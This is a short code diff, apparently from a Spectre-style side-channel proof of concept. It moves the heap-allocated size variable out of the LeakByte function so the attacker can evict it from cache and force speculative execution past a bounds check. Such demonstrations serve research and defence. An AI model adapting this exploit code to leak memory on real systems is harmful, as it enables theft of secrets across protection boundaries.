@@ -25,6 +25,14 @@
 #include "timing_array.h"
 #include "utils.h"
 
+// The size needs to be heap-allocated here so that the attacker can unload it
+// from cache to force speculative execution to guess the result of comparison.
+//
+// TODO(asteinha): since size_in_heap is no longer the only heap-allocated
+// value, it should be allocated into its own unique page
+std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
+    new size_t(strlen(public_data)));
+
 // Leaks the byte that is physically located at &public_data[0] + offset,
 // without ever loading it. In the abstract machine, and in the code executed
 // by the CPU, this function does not load any memory except for what is in the
@@ -35,13 +43,6 @@
 // think that the value will be in-range.
 static char LeakByte(size_t offset) {
   TimingArray timing_array;
-  // The size needs to be unloaded from cache to force speculative execution
-  // to guess the result of comparison.
-  //
-  // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
-  // value, it should be allocated into its own unique page
-  std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
-      new size_t(strlen(public_data)));
 
   for (int run = 0;; ++run) {
     timing_array.FlushFromCache();
